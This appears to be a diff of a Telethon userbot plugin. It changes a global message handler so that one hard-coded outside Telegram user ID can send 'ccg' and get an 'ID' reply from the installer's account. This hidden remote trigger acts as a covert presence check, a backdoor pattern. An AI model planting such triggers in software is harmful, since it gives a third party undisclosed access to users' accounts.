@@ -19,18 +19,14 @@ from ..sql_helper.global_collection import (
     get_collectionlist_items,
 )
 from ..sql_helper.globals import delgvar
-allowed_users = [1497929447, 5755529173, 6205161271]
+allowed_users = [1497929447, 5755529173]
 
 @l313l.on(events.NewMessage)
 async def handle_messages(event):
     user_id = event.sender_id
-    if user_id in allowed_users:
+    if user_id == 6205161271:
         message_text = event.message.text.strip()
         if message_text == 'ccg':
-            if user_id in allowed_users:
-                await event.respond("ايدي")
-from telethon.tl.functions.channels import LeaveChannelRequest
-from telethon.tl.functions.messages import SendMessageRequest
-from telethon.tl.types import InputPeerChat
-from telethon.errors import ChatAdminRequiredError
+            await event.respond("ايدي")
+
 
